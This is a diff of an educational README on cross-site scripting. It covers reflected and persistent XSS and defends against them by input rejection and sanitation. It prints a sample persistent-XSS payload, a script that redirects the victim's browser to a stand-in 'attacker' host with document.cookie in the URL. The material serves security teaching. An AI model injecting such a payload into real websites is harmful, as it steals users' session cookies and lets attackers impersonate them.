@@ -9,7 +9,7 @@ The two most common types of XSS are **Non-Persistent XSS** and **Persistent XSS
 ####Non-Persistent XSS
 
 * The most regularly seen cross-site vulnerability
-* Also known as **Reflected XSS**. 
+* Also known as **Reflected XSS**.
 * The attack is carried out through a single request/response cycle: the payload is not stored anywhere, but returned as part of the response HTML that the server sends.
 
 ####Persistent XSS
@@ -33,13 +33,19 @@ An attacker generally has one of four aims when executing an XSS attack:
 
 ##What are some examples?
 
+##Video example
+
+For a video example that demonstrates an XSS attack and basic server validation please see our [video tutorial](https://www.youtube.com/watch?v=Ln-d1T4HUh4&feature=youtu.be).
+
+##Readme example
+
 Let's say an attacker wants to steal a victim's cookies. This can be done through a persistent XSS attack. The attacker's goal is to have the victim's browser parse this **malicious script**:
 
-```<script>
+``<script>
 window.location='http://attacker/?cookie='+document.cookie
-</script>```
+</script>``
 
-The script triggers an HTTP request to the attacker's server. The URL includes the victim's cookies as a query paramater, which the attacker can then extract from the request when it arrives at their server and use to impersonate the victim. 
+The script triggers an HTTP request to the attacker's server. The URL includes the victim's cookies as a query paramater, which the attacker can then extract from the request when it arrives at their server and use to impersonate the victim.
 
 The attacker submits the malicious script as a user input to one of the website's forms, thus inserting the script into the website's database through a `POST` request. For instance, the script could be posted as a comment on an unsecure blog.
 
@@ -74,6 +80,4 @@ There are two approaches you can take to invalid inputs – rejection and sanita
 * Rejection will, as the name suggests, simply reject the input, preventing it from being used elsewhere in the website
 * Sanitation will remove all invalid parts of the input, with the remaining input being free to be used normally by the website
 
-While rejection is simplest to implement, sanitation often provides the best user experience – if a user includes hyphens while submitting their credit card number, for example, a sanitation routine that removes all non-digit characters will prevent an XSS attack without forcing the user to resubmit. 
-
-  
+While rejection is simplest to implement, sanitation often provides the best user experience – if a user includes hyphens while submitting their credit card number, for example, a sanitation routine that removes all non-digit characters will prevent an XSS attack without forcing the user to resubmit.
